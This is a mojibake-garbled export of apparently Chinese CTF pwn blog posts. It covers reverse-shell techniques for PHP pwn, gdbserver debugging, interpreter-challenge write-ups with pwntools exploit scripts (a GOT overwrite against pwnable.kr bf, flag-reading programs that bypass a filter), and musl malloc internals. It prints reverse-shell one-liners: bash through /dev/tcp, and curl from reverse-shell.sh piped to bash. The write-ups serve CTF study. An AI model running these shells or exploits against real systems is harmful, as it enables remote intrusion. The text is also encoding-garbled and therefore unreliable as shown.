å››ã€åå¼¹shell\n\nå¸¸è§çš„åå¼¹shellå¤§æ¦‚ä»¥ä¸‹ä¸¤ç§æ–¹å¼\n\n## 1.popenç›´æ¥åå¼¹\n\nè¿™ä¸ªåªéœ€è¦æ‰§è¡Œå‘½ä»¤ï¼Œå…¶ä¸­`127.0.0.1/6666`å³è®¾ç½®ä¸ºè‡ªå·±æ”»å‡»æœºçš„ipå’Œç«¯å£\n\n```c\npopen('/bin/bash -c \"/bin/bash -i >&/dev/tcp/127.0.0.1/6666 0>&1\"');\n```\n\nå¸¸è§systemå‡½æ•°ä¸å¥½ä½¿ç”¨ï¼Œphpä¸­ä¸å¥½æ•´çš„æ—¶å€™\n\n## 2.ä½¿ç”¨ä¸­è½¬ç«™åå¼¹\n\n[GitHub - lukechilds/reverse-shell: Reverse Shell as a Service](https://github.com/lukechilds/reverse-shell)\n\næ‰§è¡Œå‘½ä»¤ï¼Œå…¶ä¸­`192.168.0.69:1337`ä¹Ÿæ˜¯è®¾ç½®ä¸ºè‡ªå·±æ”»å‡»æœºçš„ipå’Œç«¯å£\n\n```\nsystem(\"curl https://reverse-shell.sh/192.168.0.69:1337|bash\\x00\");\n```\n\nç›¸å½“äºåœ¨ä¸€ä¸ªæœåŠ¡å™¨`https://reverse-shell.sh`è¿›è¡Œä¸­è½¬\n\n\n\n# äº”ã€è°ƒè¯•æŠ€å·§\n\n## 1.å®‰è£…å¯¹åº”ç‰ˆæœ¬è°ƒè¯•\n\nè¿™ä¸ªå°±ä¸å¤šè¯´äº†ï¼Œåœ¨åšé¢˜çš„æ—¶å€™ï¼Œäº†è§£åˆ°phpç‰ˆæœ¬ï¼Œç„¶åæœ¬æœºå®‰è£…å¯¹åº”ç‰ˆæœ¬çš„phpï¼Œä¹‹ååœ¨php.iniä¸­æ·»åŠ è¯¥æ¨¡å—è°ƒè¯•å³å¯\n\n## 2.gdbserverè°ƒè¯•\n\næœ‰äº›é¢˜ç›®ä¼šç»™ç°æˆçš„dockerç¯å¢ƒï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥åœ¨é‡Œé¢ä½¿ç”¨gdbserverè°ƒè¯•ï¼Œä½†æ˜¯æœ‰ç‚¹é—®é¢˜å°±æ˜¯ï¼Œè°ƒè¯•çš„æ—¶å€™å¥½åƒæ²¡åŠæ³•ä½¿ç”¨`run`å‘½ä»¤æ¥è¿è¡Œphpæ–‡ä»¶ï¼Œè€Œç›´æ¥è°ƒè¯•`php pwn.php`çš„è¯ï¼Œå¼€å§‹çš„æ—¶å€™ç›¸åº”çš„.soæ¨¡å—ä¸ä¼šè¢«åŠ è½½è¿›å…¥ï¼Œæ²¡åŠæ³•ä¸‹æ–­ç‚¹ã€‚\n\né‚£ä¹ˆå¯ä»¥å…ˆå°†æœ¬åœ°çš„ASLRå…³é—­ï¼Œè¿™æ ·dockerä¸­çš„ASLRä¹Ÿæ˜¯å…³é—­çŠ¶æ€\n\nç„¶å`gdbserver 127.0.0.1:6666 php`ï¼Œå®¿ä¸»æœº`target remote:6666;c`è¿œç¨‹åŠ è½½è¿è¡Œèµ·æ¥ï¼Œæ‰¾åˆ°å¯¹åº”`.so`æ¨¡å—çš„åŠ è½½åœ°å€`so_addr`\n\nä¹‹åå†`gdbserver 127.0.0.1:6666 php pwn.php`ï¼Œå®¿ä¸»æœºè¿œç¨‹åŠ è½½ï¼Œä½¿ç”¨`add-symbol-file file.so so_addr`ä»è€ŒåŠ è½½è¿›ç¬¦å·è¡¨ï¼Œç„¶åå³å¯ä¸‹æ–­ç‚¹è°ƒè¯•äº†ã€‚\n","tags":["PHP_PWN"],"categories":["PHP_PWN"]},{"title":"è§£é‡Šå™¨PWN","url":"/2022/02/09/è§£é‡Šå™¨PWN/","content":"\n\n\n# å‰è¨€\n\nè®°å½•ä¸€ä¸‹è§£é‡Šå™¨ç±»å‹çš„PWNé¢˜\n\nå‚ç…§ï¼š[è§£é‡Šå™¨ç±»å‹çš„Pwné¢˜ç›®æ€»ç»“ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/208940#h2-2)\n\n# ä¸€ã€pwnable_bf\n\n[`brainfuck`è¯­è¨€](https://zh.wikipedia.org/wiki/Brainfuck)çš„è§£é‡Šå™¨ï¼Œå…¶ä¸­æŒ‡é’ˆpæŒ‡å‘bssæ®µä¸Šçš„tape\n\n![image-20220209105933118](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202091059160.png)\n\nå‚ç…§ï¼š[Brain fuck-pwnable.krä¸‰ç§æ€è·¯è¯¦è§£ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·](https://www.freebuf.com/vuls/216749.html)\n\nå…¶ä¸­å„ä¸ªåˆ†æ”¯ï¼ˆç¬¦å·ä»£è¡¨ï¼‰çš„åŠŸèƒ½ï¼Œå¯è§ä¸‹è¡¨ï¼šï¼ˆéƒ¨åˆ†æ¥æºäº[TaQini](https://blog.csdn.net/SmalOSnail/article/details/53679546#commentsedit)ï¼‰\n\n| æ“ä½œ |    å«ä¹‰     |      è§£é‡Š      |\n| :--: | :---------: | :------------: |\n|  >   |   p += 1    |     på€¼åŠ 1     |\n|  <   |   p -= 1    |     på€¼å‡1     |\n|  +   |  (*p) += 1  | på€¼æŒ‡å‘çš„å€¼åŠ 1 |\n|  -   |  (*p) -= 1  | på€¼æŒ‡å‘çš„å€¼å‡1 |\n|  .   | putchar(*p) |      è¾“å‡º      |\n|  ,   | getchar(*p) |      è¾“å…¥      |\n\nç®€å•æ¥è¯´å°±æ˜¯ï¼š`,.`åˆ†åˆ«æ§åˆ¶è¾“å…¥è¾“å‡ºï¼›`<>`æ§åˆ¶æŒ‡é’ˆpçš„å–å€¼åŠ å‡ï¼›`+-`æ§åˆ¶æŒ‡é’ˆpæŒ‡å‘çš„å†…å­˜ä¸Šçš„å€¼çš„åŠ å‡ã€‚\n\næ‰€ä»¥è¿™é‡Œå°±å¾ˆæ˜æ˜¾ï¼Œç”±äºæ²¡æœ‰å¯¹påšé™åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ§åˆ¶æŒ‡é’ˆpæ¥ç§»åŠ¨åˆ°ä¸€ä¸ªèŒƒå›´å†…çš„ä»»æ„åœ°æ–¹\n\n![image-20220209110158154](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202091101187.png)\n\næœ€å¤šç§»åŠ¨1024æ¬¡ï¼Œä¹Ÿå°±æ˜¯åœ¨å¦‚ä¸‹èŒƒå›´å¤„\n\n```\n&tape Â± 1024\n```\n\nåˆç”±äºtapeåœ¨bssæ®µä¸Šï¼Œè·ç¦»Gotè¡¨æ¯”è¾ƒè¿‘ï¼Œå¹¶ä¸”å®é™…ä¸Šåœ¨IDAä¸­æŸ¥çœ‹ä¹Ÿç¡®å®å¦‚æ­¤ï¼Œé‚£ä¹ˆä¹‹åæˆ‘ä»¬å°±å¯ä»¥å€ŸåŠ©`,`æ¥è¾“å‡ºgotè¡¨ä¸­å†…å®¹ï¼Œæ³„éœ²åœ°å€ï¼Œç„¶åä¿®æ”¹putcharçš„gotè¡¨ï¼Œç›´æ¥è·³è½¬one_gadgetå³å¯ã€‚\n\n```python\n#coding:utf-8\nfrom pwn import *\ncontext.log_level = 'debug'\nelf = ELF(\"./bf\")\nlibc = ELF(\"./libc.so.6\")\n\n\nglobal p\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\nuu32    = lambda data   :u32(data.ljust(4, '\\0'))\nuu64    = lambda data   :u64(data.ljust(8, '\\0'))\nu64Leakbase = lambda offset :u64(ru(\"\\x7f\")[-6: ] + '\\0\\0') - offset\nu32Leakbase = lambda offset :u32(ru(\"\\xf7\")[-4: ]) - offset\nit      = lambda                    :p.interactive()\n\n# address\ntape_addr = 0x0804A0A0\nputchar_addr = 0x0804A030\n# build payload\npayload = '' \npayload += '<' * (tape_addr - putchar_addr) # move to putchar address(0x0804A030)\npayload += '.' # load putchar into plt (for the time to use putchar)\npayload += '.>' * 0x4 # load putchar real address\npayload += '<' * 0x4 + ',>' * 0x4 # overload putchar\npayload += '.' # getshell\nlog.info(\"start send\")\np = remote('pwnable.kr',9001)\n#p = process(\"./bf\")\np.recvuntil('welcome to brainfuck testing system!!\\ntype some brainfuck instructions except [ ]\\n')\np.sendline(payload)\n\nlibc_base_addr = u32Leakbase(libc.sym['putchar'])\np.send(p32(libc_base_addr + 0x5fbc6))\np.interactive()\n```\n\n\n\n# äºŒã€2020 RCTF bf\n\nè¿™é¢˜ä¸å¤ªæƒ³è°ƒï¼Œä¹Ÿæ˜¯brainFuckè¯­è¨€çš„ï¼Œä½†æ˜¯åœ¨`[]`çš„å®ç°ä¸Šæœ‰ç‚¹é—®é¢˜ï¼Œcodeåœ¨æ ˆä¸Šï¼Œä¼šå­˜åœ¨Off-by-oneçš„æƒ…å†µï¼Œåˆšå¥½æº¢å‡ºåˆ°code_addrï¼Œå¯é€šè¿‡ä¿®æ”¹code_addræ¥æ§åˆ¶ç¨‹åºæµä»è€Œè¿›è¡ŒROPã€‚\n\n\n\n# ä¸‰ã€2020 DAS-CTF OJ0\n\nCç¼–è¯‘å™¨ï¼Œæ²¡æœ‰é™„ä»¶ï¼Œè¿‡æ»¤äº†`home`ã€`ctf`ã€`flag`ç­‰æ•æ„Ÿå­—ç¬¦å’Œsystemï¼Œexecç±»çš„å‡½æ•°\n\n## è§£æ³•ä¸€ï¼šç›´æ¥è¯»å–\n\né€šè¿‡ç¼–å†™ç¨‹åºè¯»å–`/home/ctf/flag`ï¼Œç»•è¿‡è¿‡æ»¤\n\n```python\nfrom pwn import *\n\ncontext(log_level=\"debug\", arch=\"amd64\")\n\nio = remote(\"183.129.189.60\", 10075)\n\nprogram = \"\"\"\n#include <stdio.h>\n\nint main(){\n\tchar buff[128]={0}, file[128]={0};\n\tscanf(\"%s\", file);\n\tFILE* fp = fopen(file, \"r\");\n\tfscanf(fp, \"%s\", buff);\n\tprintf(\"%s\", buff);\n\treturn 0\n}@\n\n\"\"\"\n\nio.sendlineafter(\"'@')\", program)\nio.sendlineafter(\"(Y/n)\", \"/home/ctf/flag\")\n\nio.interactive()\n```\n\n## è§£æ³•äºŒï¼šæ‹¼æ¥è¯»å–\n\nç”±äºè¿‡æ»¤äº†ï¼Œæ‰€ä»¥å¯ä»¥å°è¯•åƒWebé‡Œé¢çš„é‚£ç§æ‹¼æ¥è¯»å†™\n\n```python\nfrom pwn import *\n\ncontext(log_level=\"debug\", arch=\"amd64\")\n\nio = remote(\"183.129.189.60\", 10075)\n\nprogram = \"\"\"\n#include <stdio.h>\n#include<string.h>\n\nint main(){\n    char buf[50]; \n    char path_part_1[5] = \"/hom\"; \n    char path_part_2[5] = \"e/ct\"; \n    char path_part_3[5] = \"f/fl\"; \n    char path_part_4[5] = \"agx00\"; \n    char path[20];\n    sprintf(path, \"%s%s%s%s\", path_part_1, path_part_2, path_part_3, path_part_4);\n    int fd = open(path);\n    read(fd,buf,50);\n    write(1,buf,50);\n}@\n\n\"\"\"\n\nio.sendlineafter(\"'@')\", program)\n\nio.interactive()\n```\n\n\n\n# å››ã€DEFCON CTF Qualifier 2020 introool \n\nè¿™é¢˜ä¸å¤ªæƒ³è°ƒï¼Œå°±æ˜¯patchï¼Œå†™æ±‡ç¼–è·³è½¬shellcodeç­‰\n\n\n\n# äº”ã€[Redhat2019] Kaleidoscope\n\nè¿™é¢˜æ‰¾ä¸ç€é™„ä»¶ï¼Œç®€å•æ¥è¯´å°±æ˜¯ä¸¤ä¸ªä¸œè¥¿`Kaleidoscope`å³æ—¶è§£é‡Šå™¨å’Œ`honggfuzz`\n\n\n\n\n\n# å…­ã€2020 DAS-CTF OJ1\n\nä¸èƒ½è¾“å…¥æ‹¬å·ï¼Œå¤§ä¸­å°æ‹¬å·ç­‰ï¼Œä¾‹å¦‚`int main(){}`ç­‰ç­‰éƒ½ä¸è¡Œï¼Œå¯ä»¥ç”¨å¦‚ä¸‹çš„å½¢å¼æ¥è¿›è¡Œ\n\n```C\nconst char main=0x55,a1=0x48,a2=0x89,a3=0xe5;\n```\n\nç¼–è¯‘ä¹‹åå¯ä»¥çœ‹åˆ°å¦‚ä¸‹ï¼Œç›´æ¥å½¢æˆæ±‡ç¼–ä»£ç ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥å†™æ±‡ç¼–é€šiè¿‡shellcodeæˆ–è€…orwæ¥è·å–flagäº†ã€‚\n\n![image-20220209133547687](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202091335752.png)\n\n![image-20220209133415993](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202091334057.png)\n","tags":["è§£é‡Šå™¨"],"categories":["PWN","è§£é‡Šå™¨"]},{"title":"Muslä»0å¼€å§‹","url":"/2022/01/22/Muslä»0å¼€å§‹/","content":"\n\n\n\n\n\n\n# ä¸€ã€1.2.0åŠä»¥å‰ç‰ˆæœ¬\n\n## 1.æ•°æ®ç»“æ„\n\n### (1)chunkç»“æ„\n\n```c\n//v1.2.0 å®šä¹‰åœ¨src/internal/malloc_impl.hä¸­\nstruct chunk {\n    size_t psize, csize; // ç›¸å½“äº glibc çš„ prev size å’Œ size\n    struct chunk *next, *prev;\n};\n```\n\nâ‘ ä¸é‡ç”¨psizeå­—æ®µ\n\nâ‘¡psizeå’Œsizeéƒ½æœ‰inuseæ ‡å¿—ä½ï¼Œåˆ†åˆ«ä»£è¡¨å‰ä¸€ä¸ªchunkå’Œå½“å‰chunkçš„ä½¿ç”¨çŠ¶æ€ã€‚\n\n### (2)å †ç®¡ç†ç»“æ„mal\n\nç±»ä¼¼äºarenaï¼Œè®°å½•å †ä¸­çš„ç›¸å…³çŠ¶æ€ï¼Œbinsç»“æ„ä½“ç­‰\n\n```c\n//v1.2.0  å®šä¹‰åœ¨src/malloc/malloc.cä¸­\nstatic struct {\n\tvolatile uint64_t binmap; //64ä½æ— ç¬¦å·æ•´æ•°binmap\n\tstruct bin bins[64];\n\tvolatile int free_lock[2];\n} mal;\n```\n\n### (3)bitmap:\n\n`binmap`è®°å½•æ¯ä¸ª bin æ˜¯å¦ä¸ºéç©ºï¼Œè‹¥å¯¹åº”æŸä¸ªæ¯”ç‰¹ä½ä¸º 1ï¼Œåˆ™è¡¨ç¤ºå¯¹åº”çš„ bin ä¸ºéç©ºï¼Œå­˜åœ¨chunk\n\nåœ¨unbinå‡½æ•°æ“ä½œè¿‡ç¨‹ä¸­ï¼Œå¦‚æœæ“ä½œçš„chunk(C)çš„prevå’ŒnextæŒ‡é’ˆç›¸ç­‰ï¼Œå°±ä¼šå°†å¯¹åº”çš„binçš„bitmapè®¾ç½®ä¸º0ï¼Œä½¿å…¶å¤„äºç½®ç©ºçš„çŠ¶æ€ã€‚\n\n### (4)bins\n\n```c\n//v1.2.0 å®šä¹‰åœ¨src/internal/malloc_impl.hä¸­\nstruct bin {\n    volatile int lock[2];\n    struct chunk *head;\n    struct chunk *tail;\n};\n```\n\næ„æˆç±»ä¼¼unsortedbinçš„åŒå‘å¾ªç¯é“¾è¡¨ï¼Œå½“é“¾è¡¨ä¸ºç©ºæ—¶ï¼Œ`head`å’Œ`tail`æŒ‡é’ˆç­‰äº 0 æˆ–è€…æŒ‡å‘é“¾è¡¨å¤´éƒ¨è‡ªèº«ã€‚\n\næ¯ä¸ªbinå­˜å‚¨çš„chunkèŒƒå›´å¦‚ä¸‹\n\n| bin ä¸‹æ ‡ i | chunk å¤§å°ä¸ªæ•° |  chunk å¤§å°èŒƒå›´   |           ä¸‹æ ‡ i ä¸ chunk å¤§å°èŒƒå›´çš„å…³ç³»            |\n| :--------- | :------------- | :---------------: | :-------------------------------------------------: |\n| 0-31       | 1              |   0x20 â€“ 0x400    |                    (i+1) * 0x20                     |\n| 32-35      | 8              |   0x420 â€“ 0x800   |    (0x420+(i-32) *0x100) ~ (0x500+(i-32)* 0x100)    |\n| 36-39      | 16             |  0x820 â€“ 0x1000   |   (0x820+(i-36) *0x200) ~ (0x1000+(i-36)* 0x200)    |\n| 40-43      | 32             |  0x1020 â€“ 0x2000  |   (0x1020+(i-40) *0x400) ~ (0x1400+(i-40)* 0x400)   |\n| 44-47      | 64             |  0x2020 â€“ 0x4000  |   (0x2020+(i-44) *0x800) ~ (0x2800+(i-44)* 0x800)   |\n| 48-51      | 128            |  0x4020 â€“ 0x8000  |  (0x4020+(i-48) *0x1000) ~ (0x5000+(i-48)* 0x1000)  |\n| 52-55      | 256            | 0x8020 â€“ 0x10000  |  (0x8020+(i-52) *0x2000) ~ (0xa000+(i-52)* 0x2000)  |\n| 56-59      | 512            | 0x10020 â€“ 0x20000 | (0x10020+(i-56) *0x4000) ~ (0x14000+(i-56)* 0x4000) |\n| 60-62      | 1024           | 0x20020 â€“ 0x38000 | (0x20020+(i-60) *0x8000) ~ (0x28000+(i-60)* 0x8000) |\n| 63         | æ— é™           |   0x38000 ä»¥ä¸Š    |                      0x38000 ~                      |\n\nå‰ 32 ä¸ª bin ç±»ä¼¼ fastbinå’Œsmallbinï¼Œæ¯ä¸ª bin åªå¯¹åº”ä¸€ç§å¤§å°çš„ chunkï¼Œä½†æ˜¯ä¹Ÿæ˜¯åŒå‘å¾ªç¯é“¾è¡¨ï¼Œç¬¬ä¸€ä¸ªé‡Šæ”¾åˆ°binsä¸­çš„chunkéƒ½ä¼šä½¿å¾—nextå’ŒprevæŒ‡é’ˆå¸¦ä¸Šlibcåœ°å€ã€‚\n\nåé¢çš„åˆ™ç±»ä¼¼largebinï¼Œå¯¹åº”å¤šç§èŒƒå›´å¤§å°çš„chunkã€‚\n\n\n\n## 2.ç»´æŠ¤æ–¹å¼\n\nåœ¨ 64 ä½ç³»ç»Ÿä¸‹ chunk å¤§å°æ˜¯ä»¥ 32 å­—èŠ‚å¯¹é½çš„ï¼Œè¿™ä¸ glibc 16 å­—èŠ‚å¯¹é½ä¸åŒï¼Œæ•… chunk å¤§å°æœ€å°ä¸º 0x20 å­—èŠ‚ï¼Œç„¶åæŒ‰ 0x40ã€0x60ã€0x80â€¦ é€æ¸é€’å¢ï¼Œä¸å…±ç”¨psizeä½ï¼Œæ‰€ä»¥æ¯æ¬¡éƒ½ä¼šå°†ç”³è¯·çš„size+0x10ã€‚\n\n```\nmalloc(0x10)->0x20\nmalloc(0x11)->0x40\nmalloc(0x2f)->0x40\nmalloc(0x30)->0x40\nmalloc(0x31)->0x60\n```\n\nç»´æŠ¤é“¾è¡¨çš„æ–¹å¼æ˜¯ FILOï¼ˆä»é“¾è¡¨é¦–éƒ¨å–å‡º chunkï¼Œä»å°¾éƒ¨æ’å…¥ chunkï¼‰ï¼Œå¹¶ä¸”éƒ½æ˜¯åŒå‘å¾ªç¯é“¾è¡¨\n\næ²¡æœ‰å®ç°å¦‚`__malloc_hook`ã€`__free_hook`ä¹‹ç±»çš„ hook å‡½æ•°\n\n\n\n## 3.å…³é”®å‡½æ•°\n\n### (1)mallco\n\n```c\n//v1.2.0  src/malloc/malloc.cä¸­\nvoid *malloc(size_t n)\n{\n\tstruct chunk *c;\n\tint i, j;\n\n    //è°ƒæ•´nå¤§å°ï¼Œå¯¹é½0x20\n\tif (adjust_size(&n) < 0) return 0;\n\n    //å¦‚æœnå¤§äºMMAP_THRESHOLD (0x38000)ï¼Œä½¿ç”¨ mmap\n\tif (n > MMAP_THRESHOLD) {\n\t\tsize_t len = n + OVERHEAD + PAGE_SIZE - 1 & -PAGE_SIZE;\n\t\tchar *base = __mmap(0, len, PROT_READ|PROT_WRITE,\n\t\t\tMAP_PRIVATE|MAP_ANONYMOUS, -1, 0);\n\t\tif (base == (void *)-1) return 0;\n\t\tc = (void *)(base + SIZE_ALIGN - OVERHEAD);\n\t\tc->csize = len - (SIZE_ALIGN - OVERHEAD);\n\t\tc->psize = SIZE_ALIGN - OVERHEAD;\n\t\treturn CHUNK_TO_MEM(c);\n\t}\n\n    //è®¡ç®—å¯¹åº”çš„binmapä¸‹æ ‡i\n\ti = bin_index_up(n);\n\tfor (;;) {\n        //æŸ¥æ‰¾binmap\n\t\tuint64_t mask = mal.binmap & -(1ULL<<i);\n        \n        //å¦‚æœbinå‡ä¸ºç©ºï¼Œé‚£ä¹ˆè°ƒç”¨expand_heapå‡½æ•°å»¶å±•å †ç©ºé—´ï¼Œç”Ÿæˆæ–°çš„chunkè¿”å›\n\t\tif (!mask) {\n\t\t\tc = expand_heap(n);\n\t\t\tif (!c) return 0;\n\t\t\tif (alloc_rev(c)) {\n\t\t\t\tstruct chunk *x = c;\n\t\t\t\tc = PREV_CHUNK(c);\n\t\t\t\tNEXT_CHUNK(x)->psize = c->csize =\n\t\t\t\t\tx->csize + CHUNK_SIZE(c);\n\t\t\t}\n\t\t\tbreak;\n\t\t}\n        \n        //è·å–å¤§å°æœ€æ¥è¿‘n(size)çš„å¯ç”¨binä¸‹æ ‡j\n\t\tj = first_set(mask);\n\t\tlock_bin(j);\n\t\tc = mal.bins[j].head;\n        //BIN_TO_CHUNKä¸çŸ¥é“ä»€ä¹ˆå‡½æ•°\n\t\tif (c != BIN_TO_CHUNK(j)) {ã€\n            //ä½¿ç”¨ pretrimåˆ¤æ–­cçš„å¤§å°å’Œéœ€æ±‚çš„size(n)ï¼Œç›¸å·®å¤ªå¤§å°±åˆ‡å‰²\n            //å¦åˆ™ä½¿ç”¨ unlockä»é“¾è¡¨ä¸­å–å‡º\n\t\t\tif (!pretrim(c, n, i, j)) unbin(c, j);\n\t\t\tunlock_bin(j);\n\t\t\tbreak;\n\t\t}\n\t\tunlock_bin(j);\n\t}\n\n\t/* Now patch up in case we over-allocated */\n    //åˆ‡å‰²ä¹‹åå›æ”¶ c ä¸­å¤§å°è¶…è¿‡ n çš„éƒ¨åˆ†\n\ttrim(c, n);\n\n\treturn CHUNK_TO_MEM(c);\n}\n```\n\n#### è¯¦ç»†æ­¥éª¤ï¼š\n\n+ è°ƒæ•´ nï¼Œå¯¹é½0x20\n\n+  å¦‚æœ n > MMAP_THRESHOLD (0x38000)ï¼Œä½¿ç”¨ mmap åˆ›å»ºä¸€å—å¤§å°ä¸º n çš„å†…å­˜ï¼Œè¿”å›ç»™ç”¨æˆ·ã€‚\n\n+ å¦‚æœ n <= MMAP_THRESHOLD (0x38000)ï¼Œè®¡ç®— n å¯¹åº”çš„ bin ä¸‹æ ‡ iï¼ŒæŸ¥æ‰¾ binmap\n\n  + å¦‚æœæ‰€æœ‰çš„å¯ç”¨ bin å‡ä¸ºç©ºï¼Œè°ƒç”¨expand_heapå‡½æ•°å»¶å±•å †ç©ºé—´ï¼Œç”Ÿæˆä¸€ä¸ªæ–°çš„ chunkè¿”å›\n\n  + å¦‚æœå­˜åœ¨éç©ºçš„å¯ç”¨ binï¼Œé€‰æ‹©å¤§å°æœ€æ¥è¿‘ n çš„ bins[j]ï¼Œå¾—åˆ° bin é“¾è¡¨é¦–éƒ¨çš„ chunk c\n    å¦‚æœç¬¦åˆ pretrim æ¡ä»¶ï¼Œä½¿ç”¨ pretrim åˆ†å‰² cï¼Œå¦åˆ™ä½¿ç”¨ unbin ä»é“¾è¡¨ä¸­å–å‡º cï¼Œæœ€åå°†åˆ†å‰²å‰©ä¸‹çš„chunkè¿›å…¥trimå‡½æ•°å›æ”¶ï¼Œå°†cè¿”å›ç»™ç”¨æˆ·ã€‚\n\nè‡³äºé‚£ä¸ªunlock_binå¥½åƒæ˜¯åŒæ­¥ç”¨çš„ï¼Œåº”è¯¥æ˜¯å¤šçº¿ç¨‹é˜²æ­¢ç«äº‰è¯»å†™å§ï¼Œä¸å¤ªæ‡‚\n\n```c\n//v1.2.0  src/malloc/malloc.cä¸­\n/* Synchronization tools */\n\nstatic inline void lock(volatile int *lk)\n{\n\tif (libc.threads_minus_1)\n\t\twhile(a_swap(lk, 1)) __wait(lk, lk+1, 1, 1);\n}\n\nstatic inline void unlock(volatile int *lk)\n{\n\tif (lk[0]) {\n\t\ta_store(lk, 0);\n\t\tif (lk[1]) __wake(lk, 1, 1);\n\t}\n}\n\nstatic inline void lock_bin(int i)\n{\n\tlock(mal.bins[i].lock);\n\tif (!mal.bins[i].head)\n\t\tmal.bins[i].head = mal.bins[i].tail = BIN_TO_CHUNK(i);\n}\n\nstatic inline void unlock_bin(int i)\n{\n\tunlock(mal.bins[i].lock);\n}\n```\n\n\n\n#### â‘ unbin\n\nç±»ä¼¼äºunlinkçš„è§£é“¾æ“ä½œï¼Œæ— ä»»ä½•æ£€æµ‹\n\n```c\n//v1.2.0  src/malloc/malloc.cä¸­\nstatic void unbin(struct chunk *c, int i)\n{\n\tif (c->prev == c->next)\n\t\ta_and_64(&mal.binmap, ~(1ULL<<i));\n    //è§£é“¾\n\tc->prev->next = c->next;\n\tc->next->prev = c->prev;\n    //è®¾ç½® INUSE æ ‡å¿—ä½ï¼ŒåŒé‡æ ‡å¿—ä½éƒ½ä¼šè®¾ç½®\n\tc->csize |= C_INUSE;\n\tNEXT_CHUNK(c)->psize |= C_INUSE;\n}\n```\n\n#### â‘¡pretrim\n\nåˆ‡å‰²chunkï¼Œéœ€è¦æ»¡è¶³ä¸€å®šæ¡ä»¶æ‰ä¼šè¿›è¡Œåˆ‡å‰²æ“ä½œ\n\n```c\n//v1.2.0  src/malloc/malloc.cä¸­\n/* pretrim - trims a chunk _prior_ to removing it from its bin.\n * Must be called with i as the ideal bin for size n, j the bin\n * for the _free_ chunk self, and bin j locked. */\nstatic int pretrim(struct chunk *self, size_t n, int i, int j)\n{\n\tsize_t n1;\n\tstruct chunk *next, *split;\n\n\t/* We cannot pretrim if it would require re-binning. */\n\tif (j < 40) return 0;// æ¡ä»¶ 1:j(å¤§å°æœ€æ¥è¿‘sizeçš„å¯ç”¨binä¸‹æ ‡)å¤§äº 40\n    \n    // æ¡ä»¶ 2: j(å¤§å°æœ€æ¥è¿‘sizeçš„å¯ç”¨binä¸‹æ ‡)ä¸i(è®¡ç®—å‡ºæ¥çš„binä¸‹æ ‡)ç›¸éš” 3 ä¸ª bin æˆ–ä»¥ä¸Šï¼Œ\n    // æˆ–è€…j(å¤§å°æœ€æ¥è¿‘sizeçš„å¯ç”¨binä¸‹æ ‡)ç­‰äº63ä¸”sizeç›¸å·®å¤§äº MMAP_THRESHOLD(0x38000)\n\tif (j < i+3) {\n\t\tif (j != 63) return 0;\n\t\tn1 = CHUNK_SIZE(self);\n\t\tif (n1-n <= MMAP_THRESHOLD) return 0;\n\t} else {\n\t\tn1 = CHUNK_SIZE(self);\n\t}\n    \n    //æ¡ä»¶3: sizeç›¸å·®çš„æ•°å€¼å±äºbins[j]çš„èŒƒå›´å†…ï¼Œå³splitä¸selfå±äºåŒä¸€ä¸ªbin\n\tif (bin_index(n1-n) != j) return 0;\n\n    //åˆ‡å‰²å‡ºä¸€å—å¤§å°ä¸ºnçš„chunkç”¨æ¥è¿”å›\n\tnext = NEXT_CHUNK(self);\n\tsplit = (void *)((char *)self + n);\n\n\tsplit->prev = self->prev;\n\tsplit->next = self->next;\n\tsplit->prev->next = split;\n\tsplit->next->prev = split;\n\tsplit->psize = n | C_INUSE;\n\tsplit->csize = n1-n;\n\tnext->psize = n1-n;\n\tself->csize = n | C_INUSE;\n\treturn 1;\n}\n```\n\nå–ä¸ªåå­—å¥½å¬ç‚¹ï¼š\n\n`Jï¼šsearch_bin_idx`\n\n`Iï¼šcalc_bin_idx`\n\n`nï¼šneed_size`\n\næ€»çš„æ¡ä»¶å¦‚ä¸‹ï¼š\n\n+ `search_bin_idx`å¤§äº 40\n\n+ `search_bin_idx`ä¸`calc_bin_idx`ç›¸éš” 3 ä¸ª bin æˆ–ä»¥ä¸Šï¼Œæˆ–è€…`search_bin_idx`ç­‰äº63ä¸”`bins[search_bin_idx].head->size - need_size > MMAP_THRESHOLD(0x38000)`\n\n+ `bins[search_bin_idx].head->size - need_size`çš„å€¼åœ¨`bins[search_bin_idx]`ä¸­\n\nå³åœ¨å°†Chunkæ‹¿å‡ºbinä¹‹å‰ï¼Œå…ˆè¿›è¡Œåˆ‡å‰²èµ‹å€¼ï¼Œè®¾ç½®å¯¹åº”çš„æŒ‡é’ˆï¼Œç„¶åæ‰è§£é“¾ï¼Œchunkè¿˜æ˜¯ä»binä¸­æ‰¾åˆ°çš„chunkï¼Œä¹‹ååœ¨unbinä¸­è¿›è¡Œinuseä½çš„ä¿®æ”¹ã€‚\n\n\n\n#### â‘¢trim\n\n```C\n//v1.2.0  src/malloc/malloc.cä¸­\nstatic void trim(struct chunk *self, size_t n)\n{\n\tsize_t n1 = CHUNK_SIZE(self);\n\tstruct chunk *next, *split;\n\n    //ç±»ä¼¼äºunsortebinä¸­å¦‚æœå¤šå‡ºæ¥çš„sizeå°äº0x10ï¼Œé‚£å°±ç›´æ¥è¿”å›ç»™ç”¨æˆ·ä¸€æ ·\n    //DONTCARE(0x10)ï¼Œä¹Ÿå°±æ˜¯ç¡®ä¿å›æ”¶çš„chunkçš„sizeè‡³å°‘ä¸º0x10ï¼Œchunkè‡³å°‘0x20å¯¹é½\n\tif (n >= n1 - DONTCARE) return;\n\n\tnext = NEXT_CHUNK(self);\n\tsplit = (void *)((char *)self + n);\n\n\tsplit->psize = n | C_INUSE;\n\tsplit->csize = n1-n | C_INUSE;\n\tnext->psize = n1-n | C_INUSE;\n\tself->csize = n | C_INUSE;\n\n    // å°†å¤šä½™çš„chunké‡Šæ”¾åˆ° bin\n\t__bin_chunk(split);\n}\n```\n\n\n\n### 